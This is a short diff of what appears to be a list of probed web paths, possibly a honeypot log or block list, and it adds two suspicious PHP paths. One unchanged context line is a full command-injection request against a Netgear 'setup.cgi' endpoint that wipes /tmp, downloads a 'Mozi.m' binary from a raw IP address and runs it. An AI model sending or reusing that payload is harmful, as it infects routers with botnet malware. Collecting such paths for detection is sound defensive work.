@@ -7274,3 +7274,5 @@ httpbin.org:443
 /wp-content/style.php
 /wp-includes/style.php
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.199.41.50:53445/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+/gq1OCTYo946.php
+/66.php
